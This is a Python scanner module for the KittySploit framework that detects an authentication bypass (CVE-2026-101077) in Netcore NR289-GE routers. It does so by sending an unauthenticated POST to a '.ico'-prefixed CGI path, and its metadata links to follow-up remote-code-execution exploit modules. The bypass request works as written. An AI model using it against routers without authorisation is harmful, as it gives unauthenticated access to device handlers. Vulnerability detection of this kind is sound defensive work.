#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Netcore NR289-GE CVE-2026-101077 boa .ico authentication bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Netcore NR289-GE CVE-2026-101077 Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-101077 in Netcore NR289-GE firmware V1.4.5102: the "
            "vendor boa web server whitelists any URI containing '.ico', skipping "
            "HTTP Basic authentication for all 441 cgitest.cgi handlers. Compares "
            "unauthenticated POST to /x.ico/ap_list_show.cgi vs the protected path."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-101077"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-101077",
            "https://github.com/senxitoyshuyi-ui/HACKALL",
        ],
        "modules": [
            "exploits/linux/http/netcore_nr289_ge_cve_2026_101072_rce",
            "exploits/linux/http/netcore_nr289_ge_cve_2026_101076_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "netcore",
            "router",
            "auth-bypass",
            "boa",
            "cve-2026-101077",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.25,
            "value": 1.0,
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": ".ico URI whitelist"},
                ],
                "suggested_followups": [
                    "scanner/http/netcore_nr289_ge_cve_2026_101072_detect",
                    "scanner/http/netcore_nr289_ge_cve_2026_101076_detect",
                ],
            },
        },
    }

    bypass_path = OptString(
        "/x.ico/ap_list_show.cgi",
        "Unauthenticated CGI path using .ico substring bypass",
        False,
        advanced=True,
    )
    protected_path = OptString(
        "/ap_list_show.cgi",
        "Protected CGI path (should return 401 without credentials)",
        False,
        advanced=True,
    )

    def _post(self, path: str):
        return self.http_request(
            method="POST",
            path=path,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data="noneed=noneed",
            allow_redirects=False,
        )

    def _netcore_present(self) -> bool:
        response = self.http_request(method="GET", path="/", allow_redirects=False)
        if response and int(response.status_code or 0) == 401:
            realm = (response.headers or {}).get("WWW-Authenticate", "")
            if "netcore" in realm.lower():
                return True
        probe = self._post(str(self.protected_path or "/ap_list_show.cgi"))
        if probe and int(probe.status_code or 0) == 401:
            realm = (probe.headers or {}).get("WWW-Authenticate", "")
            return "netcore" in realm.lower()
        return False

    def run(self):
        if not self._netcore_present():
            return False

        bypass = self._post(str(self.bypass_path or "/x.ico/ap_list_show.cgi"))
        protected = self._post(str(self.protected_path or "/ap_list_show.cgi"))
        if not bypass or not protected:
            return False

        bypass_ok = int(bypass.status_code or 0) == 200
        protected_denied = int(protected.status_code or 0) == 401
        if not (bypass_ok and protected_denied):
            return False

        self.set_info(
            severity="critical",
            cve="CVE-2026-101077",
            reason=(
                "Netcore boa accepts unauthenticated .ico CGI requests while "
                "blocking the same handler without the bypass prefix"
            ),
            bypass_path=str(self.bypass_path or "/x.ico/ap_list_show.cgi"),
        )
        return True
